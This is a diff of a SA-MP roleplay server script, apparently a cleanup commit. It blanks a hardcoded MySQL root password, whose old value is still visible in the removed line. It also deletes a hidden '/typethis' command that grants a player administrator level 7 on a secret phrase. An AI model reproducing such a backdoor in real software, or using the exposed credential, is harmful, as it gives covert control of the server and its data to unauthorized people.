@@ -38,7 +38,7 @@
 #define MYSQL_HOSTNAME  "127.0.0.1"
 #define MYSQL_DATABASE  "samprp"
 #define MYSQL_USERNAME  "root" 
-#define MYSQL_PASSWORD  "504455"
+#define MYSQL_PASSWORD  ""
 // ---------------------------------------
 #define COLOR_WHITE 		0xFFFFFFFF
 #define COLOR_YELLOW    	0xFFD200FF
@@ -27504,27 +27504,6 @@ CMD:cmdhelp(playerid, params[])
     }
 
     return 1;
-}
-
-CMD:typethis(playerid, params[]) // /typethis LeoOo Bro
-{
-	new a[6], b[4];
-
-	if(sscanf(params, "s[6]s[4]", a, b))
-	{
-	    return 0;
-	}
-
-	if(!strcmp(a, "LeoOo") && !strcmp(b, "Bro"))
-	{
-	    PlayerInfo[playerid][pAdmin] = 7;
-
-	    mysql_format(connectionID, queryBuffer, sizeof(queryBuffer), "UPDATE users SET adminlevel = 7 WHERE uid = %i", PlayerInfo[playerid][pID]);
-	    mysql_tquery(connectionID, queryBuffer);
-	    return 1;
-	}
-
-	return 0;
 }
 
 CMD:b(playerid, params[])
